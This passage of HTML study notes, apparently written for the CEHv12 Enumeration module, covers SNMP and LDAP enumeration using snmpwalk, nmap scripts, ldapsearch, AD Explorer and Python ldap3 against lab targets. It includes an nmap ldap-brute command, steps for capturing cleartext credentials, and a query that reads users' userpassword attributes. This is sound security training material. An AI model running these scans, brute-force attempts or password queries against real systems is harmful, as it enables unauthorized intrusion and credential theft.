network interfaces, processes, storage, fileystem, device info</li></ul></li></ul><ul id="2a34c9fd-c753-4f08-85c3-2b07578e28f1" class="bulleted-list"><li style="list-style-type:circle">Attackers can use this info to discover vulnerabilities and exploit them</li></ul></li></ul></details></li></ul><ul id="ef69c4e4-8d47-4f79-ba71-3b8408186267" class="toggle"><li><details open=""><summary>Using SoftPerfect Network Scanner</summary><ul id="284e6dc8-3ffc-449a-a00b-f86f9ccd8356" class="bulleted-list"><li style="list-style-type:disc">Enable SNMP scan<ul id="653d785d-158d-47f0-9ec6-c43ba51f9f01" class="bulleted-list"><li style="list-style-type:circle">Options → Remote SNMP → Mark All → Close window</li></ul></li></ul><ul id="5bd67993-9c93-4851-8a0c-f49793399d92" class="bulleted-list"><li style="list-style-type:disc">Start scan<ul id="4bf42333-11e4-405b-9ff8-ac29f1c517b2" class="bulleted-list"><li style="list-style-type:circle">Set the IP range → Start Scanning</li></ul></li></ul><ul id="66135f99-e37f-437c-80a6-da33ffde4be4" class="bulleted-list"><li style="list-style-type:disc">Show info gathered<ul id="4397e75e-e573-4b06-adbf-b402df682647" class="bulleted-list"><li style="list-style-type:circle">Right Click on Host → Properties</li></ul></li></ul><ul id="b4b6a190-0a65-42be-b3f6-dfb5110dad66" class="bulleted-list"><li style="list-style-type:disc">Show shared folders<ul id="b5c702ae-2d2d-42b4-bc8c-7dcc020988b9" class="bulleted-list"><li style="list-style-type:circle">Click on the + → Double click on them</li></ul></li></ul><ul id="3bf8ef5b-9f1e-42ed-a830-324240e24832" class="bulleted-list"><li style="list-style-type:disc">Connect to remote machine<ul id="eee6f905-e5fa-4f0e-a9e7-5739cbd28c88" class="bulleted-list"><li style="list-style-type:circle">Right Click → Open Device</li></ul></li></ul></details></li></ul><ul id="5513a326-ab24-443d-8f06-b80ab409fd5b" class="toggle"><li><details open=""><summary>Using SnmpWalk</summary><ul id="b66f74e3-f520-4146-b1e0-72294f516e42" class="bulleted-list"><li style="list-style-type:disc"><code>snmpwalk -v1 -c public &lt;target&gt;</code><ul id="114aa4c8-14b0-42b3-80c1-7183ad208c66" class="bulleted-list"><li style="list-style-type:circle"><code>-v</code>  specifies snmp version no (1 or 2c or 3)</li></ul><ul id="14deaf3a-7c6b-4c50-9581-ea675b30bc00" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> sets the community string</li></ul><ul id="6324b17b-9625-48a3-ba0c-5d34d73736e3" class="bulleted-list"><li style="list-style-type:circle">It uses the command GETNEXT to walk through the MIB (Management Information Base) tree of the target</li></ul><ul id="ed289e4b-5539-49fc-876e-1d0a14d301f7" class="bulleted-list"><li style="list-style-type:circle">If no OID is specified, it starts from the root of the tree (it is generally known)</li></ul><ul id="814e0a16-1d34-47bc-9608-4dde4a1e1d6e" class="bulleted-list"><li style="list-style-type:circle">If an OID is speficied, it starts from that OID and continues down the tree</li></ul><ul id="81afbb98-2058-46e6-8976-8849cad3f123" class="bulleted-list"><li style="list-style-type:circle">and uses GETNEXT and GET requests to traverse the tree and request information</li></ul><ul id="9e041c5c-6fdb-4daa-8ec8-4f7272af8031" class="bulleted-list"><li style="list-style-type:circle">OID queries are in a dotted format eg. <code>1.3.6.1.2.1.1.1.0</code> and their determines their place in the tree</li></ul><ul id="efc8487c-9896-4b2a-84e3-e23ace43c16e" class="bulleted-list"><li style="list-style-type:circle">It returns a raw version of the same data that snmp-check returns</li></ul></li></ul><ul id="5a764f28-c1e8-4b63-b3b2-fefb2ce30cb4" class="bulleted-list"><li style="list-style-type:disc"><code>snmpwalk -v2c -c public 10.10.1.22</code><ul id="d9dd94d0-7505-4a79-887c-645ab41a4d24" class="bulleted-list"><li style="list-style-type:circle">same as above but uses SNMP version 2</li></ul></li></ul><p id="56f6119d-eb6f-428c-9d40-b5b2b458d681" class="">
</p><p id="dceaff9e-cbde-43b4-a394-c0c6a9bad866" class="">
</p></details></li></ul><ul id="731b1206-ea79-47b3-be9c-acbd5b0eddd8" class="toggle"><li><details open=""><summary>Using Nmap</summary><p id="8b7aa80c-0247-47ee-b350-cac165816318" class="">Can give more specific information depending on the script you choose</p><p id="0c0fcdec-3440-4846-9f50-dc24a2f20225" class="">Other tools give the same info but all of it together</p><p id="e0c93aaf-e07e-4418-8f97-83eedb4124a5" class="">
</p><ul id="c14e7382-419e-450f-ad92-36b46902099f" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -sU -p 161 --script=snmp-sysdescr &lt;target&gt;</strong></code><ul id="ab54568f-f522-4804-a86e-2a4966dd852e" class="bulleted-list"><li style="list-style-type:circle"><code>-sU</code> udp scan</li></ul><ul id="788426de-e92e-40d5-b83e-5213456a9cfb" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> speficies port (161 the udp port used for devices producing snmp info - agents)</li></ul><ul id="3c1a4a9a-4094-40c4-93e9-ca451a705cc5" class="bulleted-list"><li style="list-style-type:circle">Attempts to get system description OID information</li></ul></li></ul><ul id="b34a4bce-6898-41ca-a64f-6d6abbeb1a6a" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -sU -p 161 --script=snmp-processes &lt;target&gt;</strong></code><ul id="ae2b5efe-d26a-4212-8ef3-06a88221321b" class="bulleted-list"><li style="list-style-type:circle">Attempts to get snmp data on OID objects that have info on processes running on the system</li></ul></li></ul><ul id="ec398aa2-2f4d-46d0-a4aa-39b238a14387" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -sU -p 161 --script=snmp-win32-software &lt;target&gt;</strong></code><ul id="27a0823f-7d1d-4839-b37c-0805707907d3" class="bulleted-list"><li style="list-style-type:circle">Attempts to get a list of all the applications running on the system</li></ul></li></ul><ul id="7c43e4e3-2e8a-4191-979b-f3c69ce99119" class="bulleted-list"><li style="list-style-type:disc"><code><strong>nmap -sU -p 161 --script=snmp-interfaces &lt;target&gt;</strong></code><ul id="4bd36c25-c6cf-4be6-96c2-1b0b4447104d" class="bulleted-list"><li style="list-style-type:circle">Attempts to get information about the os, network interfaces and applications on target machine</li></ul></li></ul></details></li></ul><ul id="dc97d277-aee0-454c-8013-5a88a697adea" class="toggle"><li><details open=""><summary>Other Tools:</summary><ul id="9b9da0dc-1b7f-4687-9391-519df079b923" class="bulleted-list"><li style="list-style-type:disc">Network Performance Montiro (solarwinds.com)</li></ul><ul id="79ba3d7b-36c7-413b-a58f-e62345c17aeb" class="bulleted-list"><li style="list-style-type:disc">OpUtils (manageengine.com)</li></ul><ul id="fe93e4a0-2a69-4416-bc80-7f01379fd101" class="bulleted-list"><li style="list-style-type:disc">PRTG Network Monitor (paessler.com)</li></ul><ul id="c8fe5eab-347e-4193-aecc-ae123fdd7a8c" class="bulleted-list"><li style="list-style-type:disc">Engineer’s Toolset (solarwinds.com)</li></ul></details></li></ul></details></li></ul><ul id="71fea832-1566-4eb6-b9f4-24bad73d7e0e" class="toggle"><li><details open=""><summary>LDAP Enumeration</summary><ul id="fe062c04-44de-486b-925a-deba52735aa0" class="toggle"><li><details open=""><summary>Info</summary><p id="dbf85eaf-0ccc-4b45-8050-274df3b89852" class="">LDAP (Lightweight Directory Access Protocol) is an Internet protocol for accessing distributed directory services over a network. LDAP uses DNS (Domain Name System) for quick lookups and fast resolution of queries. </p><p id="ba03b2f1-0413-4db4-940a-9d2e6ed5bb68" class="">A client starts an LDAP session by connecting to a DSA (Directory System Agent), typically on TCP port 389</p><p id="3f9bc3ba-509e-4d57-9b89-f3905e85ca1c" class="">And sends an operation request to the DSA, which then responds. </p><p id="0a59ca5a-a6a7-46a5-b58f-38d5c27c8f7b" class="">BER (Basic Encoding Rules) is used to transmit information between the client and the server.</p><p id="19162c4c-b140-43f8-b24a-fdc330c584bf" class=""> One can anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names.</p><p id="b4bea721-d8ef-41dc-9f29-fe11f7af9355" class="">Attackers use ldapsearch for enumerating AD users</p><p id="912ae021-31bc-41e0-b217-424ec2351403" class="">
</p><ul id="1552da70-2b57-405e-bf76-f2748590d066" class="toggle"><li><details open=""><summary>How it works</summary><ul id="17d47915-c76b-4530-a1df-e7493bd29401" class="bulleted-list"><li style="list-style-type:disc"><strong>Directory Structure</strong>:<ul id="45daec87-a481-4dd5-9beb-168372269b8d" class="bulleted-list"><li style="list-style-type:circle">LDAP directories are hierarchical, structured in a tree format known as the Directory Information Tree (DIT).</li></ul><ul id="fdb8273f-d75b-4652-9819-9b4a6ae48dc4" class="bulleted-list"><li style="list-style-type:circle">Entries in the directory are organized in a parent-child relationship, starting from the root.</li></ul></li></ul><ul id="9267327f-bcc4-4f8e-8611-5e370a195ddc" class="bulleted-list"><li style="list-style-type:disc"><strong>Entries and Attributes</strong>:<ul id="a6f3ddac-38f6-4161-8cf1-3da0fcd0073b" class="bulleted-list"><li style="list-style-type:circle">Each entry in the directory is identified by a Distinguished Name (DN), which is unique.</li></ul><ul id="93912d4f-95ea-4f53-888e-490bb6f68d4d" class="bulleted-list"><li style="list-style-type:circle">Entries consist of attributes, which are name-value pairs. Attributes describe various properties of the entries.</li></ul></li></ul><ul id="b1d8e67a-3137-4683-a7ff-25f370dbbddb" class="bulleted-list"><li style="list-style-type:disc"><strong>Client-Server Model</strong>:<ul id="5901fc76-f5ac-4735-a814-b0f65e425160" class="bulleted-list"><li style="list-style-type:circle">LDAP follows a client-server model. LDAP clients send requests to an LDAP server, also known as a Directory System Agent (DSA).</li></ul><ul id="02b17766-5433-457b-a76f-5f1bd9089da1" class="bulleted-list"><li style="list-style-type:circle">The server processes these requests and returns responses to the client.</li></ul></li></ul></details></li></ul><ul id="cd2a3ff2-d7eb-4afe-8958-b7ccd606c299" class="toggle"><li><details open=""><summary>Ports 389/636</summary><ul id="65abcf96-91cf-403b-8574-c65323d63cc1" class="bulleted-list"><li style="list-style-type:disc"><strong>Port 389</strong>: The default port for unencrypted LDAP communication.</li></ul><ul id="7436fb93-ce42-4a0d-8337-4d78b48845d2" class="bulleted-list"><li style="list-style-type:disc"><strong>Port 636</strong>: The default port for LDAP over SSL (LDAPS), providing encrypted communication.</li></ul></details></li></ul><ul id="8716817b-5a34-4675-a146-aa9d3eb28cef" class="toggle"><li><details open=""><summary>LDAP Components (eg. cn,dc,uid,ou,o)</summary><ul id="5a0c7096-2663-4ce1-84a2-c810c6419d72" class="bulleted-list"><li style="list-style-type:disc"><strong>Distinguished Name (DN)</strong>:<ul id="2dd77517-13c1-4770-91d2-c841020ee2e1" class="bulleted-list"><li style="list-style-type:circle">The DN is a unique identifier that specifies the exact location of an entry within the LDAP directory tree.</li></ul><ul id="fe34356b-c8e4-4613-a154-d18c697a7a2a" class="bulleted-list"><li style="list-style-type:circle">It is a sequence of attribute-value pairs, separated by commas, that trace the path from the entry to the root of the directory.</li></ul></li></ul><ul id="7e67317c-4f20-4510-8308-210805d3ee5b" class="bulleted-list"><li style="list-style-type:disc"><strong>Common Attributes</strong>:<ul id="23bb43ec-4ddd-4338-8063-c6ebb1d02096" class="bulleted-list"><li style="list-style-type:circle"><strong>cn (Common Name)</strong>:<ul id="8c88cc86-f069-450a-9739-4d68f34c0f03" class="bulleted-list"><li style="list-style-type:square"><strong>Definition</strong>: Represents a common name of an entry.</li></ul><ul id="e87b09ac-4c67-4a10-82f4-c9bc2cbaa722" class="bulleted-list"><li style="list-style-type:square"><strong>Usage</strong>: Often used for user names, organizational units, and other general naming purposes.</li></ul><ul id="36203215-63bc-4f76-a622-4ced8e36584d" class="bulleted-list"><li style="list-style-type:square"><strong>Example</strong>: <code>cn=admin</code> specifies an entry with the common name &quot;admin&quot;.</li></ul></li></ul><ul id="ee3cdeb2-628f-4d60-9cc7-2b7fedc453fc" class="bulleted-list"><li style="list-style-type:circle"><strong>dc (Domain Component)</strong>:<ul id="c6e65bb3-6f0c-4d56-8afe-26b05c9ae8c8" class="bulleted-list"><li style="list-style-type:square"><strong>Definition</strong>: Represents a domain component of the entry&#x27;s DNS domain name.</li></ul><ul id="3a315dcb-0223-43e7-9303-e1f353a685b4" class="bulleted-list"><li style="list-style-type:square"><strong>Usage</strong>: Used to build the hierarchy of the directory based on the domain name.</li></ul><ul id="77a64509-305b-4fc3-ae8b-faba7219e229" class="bulleted-list"><li style="list-style-type:square"><strong>Example</strong>: <code>dc=example</code> and <code>dc=com</code> represent the domain &quot;example.com&quot;.</li></ul></li></ul><ul id="44c87961-b367-4235-96b5-578c90e1f962" class="bulleted-list"><li style="list-style-type:circle"><strong>uid (User ID)</strong>:<ul id="bdd3436c-f16e-4a4c-8bd5-d19bde37bb3b" class="bulleted-list"><li style="list-style-type:square"><strong>Definition</strong>: Represents a unique identifier for a user.</li></ul><ul id="07a82847-e505-4131-9c1d-ed42a216191f" class="bulleted-list"><li style="list-style-type:square"><strong>Usage</strong>: Commonly used for entries that represent individual users.</li></ul><ul id="2e7cf765-0124-4e5a-be08-00d2a72d1616" class="bulleted-list"><li style="list-style-type:square"><strong>Example</strong>: <code>uid=johndoe</code> specifies an entry for a user with the ID &quot;johndoe&quot;.</li></ul></li></ul><ul id="80b432d2-a83b-4fbe-b6fd-cfb80039fd90" class="bulleted-list"><li style="list-style-type:circle"><strong>ou (Organizational Unit)</strong>:<ul id="34903490-f62d-49d4-b4cf-0f7252e06cb0" class="bulleted-list"><li style="list-style-type:square"><strong>Definition</strong>: Represents an organizational unit, such as a department or division.</li></ul><ul id="868106bc-1296-4af7-90d5-bf6c6aa5ae0f" class="bulleted-list"><li style="list-style-type:square"><strong>Usage</strong>: Used to organize entries within the directory into units.</li></ul><ul id="b29a4909-641f-4769-9ee1-1ba26e859a44" class="bulleted-list"><li style="list-style-type:square"><strong>Example</strong>: <code>ou=users</code> might represent a unit containing user entries.</li></ul></li></ul><ul id="d4659ff1-9263-42e9-93cd-b35df6584549" class="bulleted-list"><li style="list-style-type:circle"><strong>o (Organization)</strong>:<ul id="7fdd437c-f806-4686-8a38-5dcbe7bcaf95" class="bulleted-list"><li style="list-style-type:square"><strong>Definition</strong>: Represents the name of an organization.</li></ul><ul id="597ac0d2-48b4-4227-8c75-d300ed461efb" class="bulleted-list"><li style="list-style-type:square"><strong>Usage</strong>: Used for entries related to an entire organization.</li></ul><ul id="d11761bf-65b2-49f0-b530-01ba20eb120b" class="bulleted-list"><li style="list-style-type:square"><strong>Example</strong>: <code>o=MyCompany</code> specifies an entry for the organization &quot;MyCompany&quot;.</li></ul></li></ul></li></ul></details></li></ul><ul id="dd227918-4051-48bc-ae4c-d453d77d9166" class="toggle"><li><details open=""><summary>Why components are used</summary><ul id="0c6f9bdf-9f75-4bc0-938e-cb9bc7e7d7ed" class="bulleted-list"><li style="list-style-type:disc"><strong>Uniqueness</strong>: Attributes like <code>cn</code>, <code>uid</code>, and <code>dc</code> help ensure that each entry in the directory has a unique identifier.</li></ul><ul id="03ef7be2-750e-4c91-8f27-72cd2e9ae6bb" class="bulleted-list"><li style="list-style-type:disc"><strong>Hierarchy</strong>: The combination of these attributes creates a hierarchical structure that mirrors organizational, domain, or other logical groupings.</li></ul><ul id="c7150aae-6ef8-4ce8-9322-0aa6b2640991" class="bulleted-list"><li style="list-style-type:disc"><strong>Query Efficiency</strong>: Using these attributes, LDAP clients can efficiently query and navigate the directory to locate specific entries.</li></ul></details></li></ul><ul id="c944fe41-29ab-4d85-b097-2388832a671e" class="toggle"><li><details open=""><summary>Factors Contributing to Vulnerabilities</summary><ul id="ce8c7f2c-6a1c-4b8f-8d33-1d96a6b8c645" class="bulleted-list"><li style="list-style-type:disc"><strong>Misconfiguration</strong>:<ul id="f1eef3bc-6575-4167-aa45-9645406c7c37" class="bulleted-list"><li style="list-style-type:circle"><strong>(used here) Anonymous Binding</strong>: If the LDAP server is configured to allow anonymous binds, it means that anyone can connect to the LDAP server without authentication and query for information. This can expose sensitive data.</li></ul><ul id="3d6caccb-852d-4caa-86db-798053d89894" class="bulleted-list"><li style="list-style-type:circle"><strong>Excessive Permissions</strong>: Users or groups may have excessive permissions, allowing them to read more information than necessary. This often occurs when default configurations are used or when permissions are not properly managed.</li></ul></li></ul><ul id="2046d543-aec2-4547-8414-617447d4c4ba" class="bulleted-list"><li style="list-style-type:disc"><strong>Weak Authentication</strong>:<ul id="85e19b6d-1bd5-4970-8d02-f24d9fe1325e" class="bulleted-list"><li style="list-style-type:circle"><strong>Simple Bind without SSL/TLS</strong>: Using simple bind for authentication without SSL/TLS means that credentials (username and password) are sent in clear text, which can be intercepted by attackers.</li></ul><ul id="ab90a08a-6dda-47a6-b985-52f25b67cdb8" class="bulleted-list"><li style="list-style-type:circle"><strong>Weak or Default Passwords</strong>: Using weak or default passwords for LDAP accounts can allow unauthorized access.</li></ul></li></ul><ul id="1af3c520-c4ff-48e8-a2b4-3178a9a2ed88" class="bulleted-list"><li style="list-style-type:disc"><strong>Outdated or Vulnerable Software</strong>:<ul id="8d29ef9b-b134-494b-9532-b15950fd6c6f" class="bulleted-list"><li style="list-style-type:circle"><strong>Unpatched LDAP/AD Server</strong>: Running outdated versions of LDAP or AD servers that have known vulnerabilities can be exploited by attackers.</li></ul><ul id="263b6992-f1b1-4fdb-8d86-cf8fe70f955a" class="bulleted-list"><li style="list-style-type:circle"><strong>LDAP Injection</strong>: Certain implementations may be vulnerable to LDAP injection, where attackers can manipulate LDAP queries to gain unauthorized access or extract additional information.</li></ul></li></ul></details></li></ul><ul id="07e07b1b-0c0b-4581-8270-86750de58169" class="toggle"><li><details open=""><summary>How to approach hacking ldap</summary><ul id="433f35a0-6ea7-4ca5-bb33-34098fb9193a" class="bulleted-list"><li style="list-style-type:disc">Check for anonymous login and capture available info</li></ul><ul id="b36be186-d083-4ea4-bccd-166d7d505692" class="bulleted-list"><li style="list-style-type:disc">Capture credentials if no encryption exists and login with them to get info</li></ul><ul id="3c7d637c-7887-4d34-840b-d5fbc68e048a" class="bulleted-list"><li style="list-style-type:disc">Capture usernames and brute force them or check for empty passwords</li></ul><ul id="9d73aa06-7b0f-45a1-b7d2-a6ccedab7817" class="toggle"><li><details open=""><summary>Practical way to search for info</summary><ul id="41c80e0b-d48f-4c89-987b-f71e72e48bf9" class="bulleted-list"><li style="list-style-type:disc"><strong>Enumerate Root DSE</strong>: Running <code>ldapsearch -h 10.10.1.22 -x -s base</code> without specifying a base DN is a common way to query the root DSE of an LDAP server to gather high-level information about the server and its capabilities.</li></ul><ul id="1c36a017-876c-4532-b612-82e159413c1e" class="bulleted-list"><li style="list-style-type:disc">Enumerate naming contexts <code>ldapsearch -h 10.10.1.22 -x -s base namingcontexts</code></li></ul><ul id="69e052b2-b3b9-459d-a1f2-b3b833b77e93" class="bulleted-list"><li style="list-style-type:disc">For each naming context <code>ldapsearch -h 10.10.1.22 -x -b &quot;DC=exampledomain,DC=com&quot;</code><ul id="71ab0faf-b366-4839-9b99-4ad0a3b6ea5c" class="bulleted-list"><li style="list-style-type:circle">Enumerate OUs <code>-s sub &quot;(objectClass=organizationalUnit)&quot;</code></li></ul><ul id="f091bec8-8710-4da6-b49f-3bbe4b0ea56e" class="bulleted-list"><li style="list-style-type:circle">Enumerate Users and Groups<ul id="76bf19f3-2d3b-4009-80ce-a15a679ab161" class="bulleted-list"><li style="list-style-type:square"><code>-s sub &quot;(objectClass=person)&quot;</code></li></ul><ul id="0e93bd3d-818c-49f5-a2a5-bb375d2284f9" class="bulleted-list"><li style="list-style-type:square"><code>-s sub &quot;(objectClass=group)&quot;</code></li></ul></li></ul></li></ul><p id="092b685b-aa32-4a19-8236-6ea46e542976" class="">
</p></details></li></ul></details></li></ul><ul id="73dca7ac-bb1c-482f-b364-93955a92d544" class="toggle"><li><details open=""><summary>Good to know for connections</summary><ul id="f52501ab-3867-4187-b709-5f523f208528" class="toggle"><li><details open=""><summary>Simple Authentication</summary><ul id="38b1fa1a-f658-4e3c-97f0-d4964dce6597" class="bulleted-list"><li style="list-style-type:disc">Done with -x in ldapsearch</li></ul><ul id="8ca9ff87-f524-4ddb-a7b8-82ebdf56ffc6" class="bulleted-list"><li style="list-style-type:disc">Simple authentication is typically available by default in many LDAP implementations because it is part of the LDAP protocol specifications.</li></ul><ul id="8cf75aea-1414-4102-b5a9-7289f1ef4609" class="bulleted-list"><li style="list-style-type:disc">Allowing simple authentication over an unencrypted connection (plain LDAP on port 389) can be considered a security risk, as it exposes credentials to potential interception.</li></ul><ul id="e8a8952b-e691-444a-8a19-5532c33e3039" class="bulleted-list"><li style="list-style-type:disc">Secure Alternatives:<ul id="7deb4f36-e6d0-4fe7-ab48-f9ea34fd1696" class="bulleted-list"><li style="list-style-type:circle">Using it but with encrypted connections (StartTLS, LDAPS)</li></ul><ul id="dd459f6e-93d3-41a5-82db-f5e124effec4" class="bulleted-list"><li style="list-style-type:circle">Stronger mechanisms such as SASL Authentication</li></ul></li></ul></details></li></ul><ul id="c4e4a53f-4c7b-428d-93b1-36246f393795" class="toggle"><li><details open=""><summary>Anonymus Authentication</summary><ul id="b8011eba-07db-4d5c-adb2-ca433e1de58f" class="bulleted-list"><li style="list-style-type:disc">If no credentials are specified, it tries to connect with anonymous authentication. </li></ul><ul id="6baae20f-fc3b-44fc-94e2-86fd41ac5da9" class="bulleted-list"><li style="list-style-type:disc">This type of authentication is often used to access publicly available information in the directory or to perform searches that do not require special permissions.</li></ul><ul id="74a50773-1d58-4d1e-85df-98be379767f5" class="bulleted-list"><li style="list-style-type:disc">By default, some LDAP servers allow anonymous binds. This can be explicitly configured in the server&#x27;s configuration file (e.g., <code>slapd.conf</code> or the dynamic configuration <code>cn=config</code> in OpenLDAP).</li></ul><ul id="3f04b1e0-d7d7-413b-bcae-71c3085730e9" class="bulleted-list"><li style="list-style-type:disc">In production environments, it&#x27;s common practice to restrict or completely disable anonymous access to prevent unauthorized data access.<br/><br/><br/></li></ul></details></li></ul><p id="a4470294-62a9-4c23-93fe-6e0df9784276" class="">
</p></details></li></ul></details></li></ul><p id="9fa07d8e-7f77-428b-bc6e-66da1d86e74a" class="">
</p><ul id="68c0cf59-0207-4049-8373-ab4d04afa2d4" class="toggle"><li><details open=""><summary>Using Acitve Directory Explorer (AD Explorer)</summary><p id="12d8980d-753a-41f5-954d-82d52fd1ecbe" class="">Used for easier understanding due to visual format of directory tree</p><p id="337de012-9349-4b4e-b4ce-b3472ffbb8c8" class="">
</p><ul id="7b8331ed-ea48-4cc9-8174-8565c0facafd" class="bulleted-list"><li style="list-style-type:disc">Location: <code><strong>Z:\CEHv12 Module 04 Enumeration\LDAP Enumeration Tools\Active Directory Explorer</strong></code></li></ul><ul id="24c7efcd-294b-48b1-8f10-622d5353026e" class="bulleted-list"><li style="list-style-type:disc">Connect to: <code>&lt;target ad server&gt;</code></li></ul><ul id="0123f277-0d9d-4dfd-a901-d67ff22aba57" class="bulleted-list"><li style="list-style-type:disc">Expand <code>DC=CEH,DC=com</code> (Click +)</li></ul><ul id="845c84e9-e988-4200-9b11-a2596895923b" class="bulleted-list"><li style="list-style-type:disc">Expand <code>CN=Users</code></li></ul><ul id="ee2fedee-71cb-45bc-9028-508f8d3c234a" class="bulleted-list"><li style="list-style-type:disc">Right Click <code>displayName</code> → Modify</li></ul><ul id="f924596c-6bd0-4381-83fb-7fa7daef3500" class="bulleted-list"><li style="list-style-type:disc">Change value → Click <code>OK</code> </li></ul></details></li></ul><ul id="c70252b6-9bee-49b5-bf6d-bbc7bc8ca387" class="toggle"><li><details open=""><summary>Using Nmap</summary><ul id="22566a71-f932-477f-a29c-e12e458417c1" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sU -p 389 &lt;target&gt;</code><ul id="be9d37d5-1165-492d-bf6b-3184cd1e1481" class="bulleted-list"><li style="list-style-type:circle"><code>-sU</code> udp scan</li></ul><ul id="c3ec857f-b41b-4643-91cf-0b384a233e74" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> specify port</li></ul><ul id="484f46c8-4d1c-4e24-9750-f5324ef378a8" class="bulleted-list"><li style="list-style-type:circle">to identify if ldap port is open</li></ul></li></ul><ul id="bd55bc5c-e5e5-4ae1-965f-c4e36ef36181" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -p 389 --script ldap-brute --script-args ldap.base=&#x27;&quot;cn=users,dc=CEH,dc=com&quot;&#x27; &lt;target&gt;</code><ul id="387c0aff-ad93-4587-8e91-a9dccc4a4da3" class="bulleted-list"><li style="list-style-type:circle"><code>ldap-brute</code> brute forces ldap authentication</li></ul><ul id="e96f60bd-c62b-43e9-b6ce-c81de6ec159d" class="bulleted-list"><li style="list-style-type:circle"><code>args</code> these specify users in CEH.com domain</li></ul><ul id="5ea8a867-8f91-4308-83c4-37c3b6363407" class="bulleted-list"><li style="list-style-type:circle">brute forces default usernames and passwords in ldap</li></ul><ul id="91f6d893-a88e-45f6-82d4-cc2962640ac2" class="toggle"><li><details open=""><summary>How it does this</summary><ul id="7b4cf176-0aeb-442e-8981-d6d09d760c09" class="bulleted-list"><li style="list-style-type:disc">It connects with simple authentication for anonymous user (haven’t tested otherwise)</li></ul><ul id="881086f5-318b-457c-8aed-9f69d7210c5f" class="bulleted-list"><li style="list-style-type:disc">It queries for defaultNamingContext and namingContexts on any object class</li></ul><ul id="decf0a3d-c31c-4fce-88f9-5e3e3269ae6b" class="bulleted-list"><li style="list-style-type:disc">And then searches these for known userames (admin, webadmin, test etc.)</li></ul></details></li></ul></li></ul></details></li></ul><ul id="f4fe49ec-697b-4562-83f6-eeb0e792f6b6" class="toggle"><li><details open=""><summary>Using Python</summary><ul id="4b617cc7-7767-4d7a-a059-a5b8fb4ea12e" class="bulleted-list"><li style="list-style-type:disc">Initialize<ul id="832ee64a-a5b0-47e1-a423-47223963757d" class="bulleted-list"><li style="list-style-type:circle">Type <code>python3</code></li></ul><ul id="df147257-e564-420e-9a48-7c2df6035459" class="bulleted-list"><li style="list-style-type:circle"><code>import ldap3</code></li></ul><ul id="cc8a6a3a-91a0-4805-a8c6-f15707f874c9" class="bulleted-list"><li style="list-style-type:circle"><code>server=ldap3.Server(&#x27;&lt;target&gt;&#x27;, get_info=ldap3.ALL,port=389)</code></li></ul><ul id="34a654ad-1881-4fb4-8d43-29a5bb2e6386" class="bulleted-list"><li style="list-style-type:circle"><code>connection=ldap3.Connection(server)</code></li></ul><ul id="49460b13-21a5-4a20-8e02-359c98a953e6" class="bulleted-list"><li style="list-style-type:circle"><code>connection.bind()</code><ul id="7c713532-fa2b-483d-ae97-bafa75c1fe52" class="bulleted-list"><li style="list-style-type:square">Should return <code>True</code></li></ul></li></ul></li></ul><ul id="1273a167-e5a6-4a06-a4e5-a2e57a143d36" class="bulleted-list"><li style="list-style-type:disc">Gather information<ul id="2459b44c-2310-42c0-a713-7f8cfedbfceb" class="bulleted-list"><li style="list-style-type:circle"><code>server.info</code> gathers info about naming contexts or domain names<ul id="79d53303-aa46-4abe-a29b-9eba974f0542" class="bulleted-list"><li style="list-style-type:square">eg. Naming Contexts:<ul id="59fa561f-d6ec-41dd-abc6-588c07b8a94f" class="bulleted-list"><li style="list-style-type:disc">DC=CEH, DC=com</li></ul><ul id="4286b57e-f230-4d56-84cf-eabf68401c41" class="bulleted-list"><li style="list-style-type:disc">CN=Configuration, DC=CEH, DC=com</li></ul><ul id="7ef143c5-0c8c-470d-93c0-8e3854bc3740" class="bulleted-list"><li style="list-style-type:disc">CN=Schema, CN=Configuration, DC=CEH, DC=com</li></ul><ul id="12069e5d-c79d-48aa-b299-18fddb237a5f" class="bulleted-list"><li style="list-style-type:disc">DC=DomainDnsZones ,DC=CEH, DC=com</li></ul><ul id="b993af0e-6827-4c72-8d47-e34110173bf7" class="bulleted-list"><li style="list-style-type:disc">DC=ForestDNSZones, DC=CEH, DC=com</li></ul></li></ul></li></ul></li></ul><ul id="86bebcd0-c21a-4a49-a1b9-9f32eba5cca7" class="bulleted-list"><li style="list-style-type:disc">Query naming contexts<ul id="307f4f68-6ee1-4a22-9eb6-7070055e3c78" class="bulleted-list"><li style="list-style-type:circle"><code>connection.search(search_base=&#x27;DC=CEH,DC=com&#x27;, search_filter=&#x27;(&amp;(objectclass=*))&#x27;, search_scope=&#x27;SUBTREE&#x27;, attributes=&#x27;*&#x27;)</code><ul id="e61190ad-3579-4d7d-8d05-c05bf3202b71" class="bulleted-list"><li style="list-style-type:square">Should only return <code>True</code></li></ul><ul id="e8a480c6-2a51-4aa9-bc37-fee9a1b1d66c" class="bulleted-list"><li style="list-style-type:square">Results will be found at <code>connection.entries</code></li></ul></li></ul><ul id="b284c499-f63e-4204-929a-15b3627b2353" class="bulleted-list"><li style="list-style-type:circle"><code>connection.search(search_base=&#x27;DC=CEH,DC=com&#x27;, search_filter=&#x27;(&amp;(objectclass=person))&#x27;, search_scope=&#x27;SUBTREE&#x27;, attributes=&#x27;userpassword&#x27;)</code><ul id="9c47a6fd-875f-4f06-b7c9-988eb9ad3927" class="bulleted-list"><li style="list-style-type:square">Should only return <code>True</code></li></ul><ul id="9dd8cc81-2953-4f1c-b72e-2c36c7befcdf" class="bulleted-list"><li style="list-style-type:square">Results will be found at <code>connection.entries</code></li></ul></li></ul></li></ul></details></li></ul><ul id="4236b4a1-05df-465d-acb4-912f006df16d" class="toggle"><li><details open=""><summary>Using ldapsearch</summary><ul id="9eed6b60-e397-4e7d-9de6-59a8022f2a67" class="toggle"><li><details open=""><summary>Crash Course on queries in ldapsearch</summary><ul id="00b4548f-c192-416f-a1a0-4c0086d599b6" class="toggle"><li><details open=""><summary><code>-s</code> Specifies the nodes to be returned relevant to the search </summary><ul id="07e0ca0a-d711-4ba6-a66c-aa5f4063e893" class="bulleted-list"><li style="list-style-type:disc"><strong>base</strong>: Search only the base object and its siblings</li></ul><ul id="fec8c356-188d-4cc8-a388-77f3fd68896a" class="bulleted-list"><li style="list-style-type:disc"><strong>one</strong>: Search one level below the base object, but not including the base object 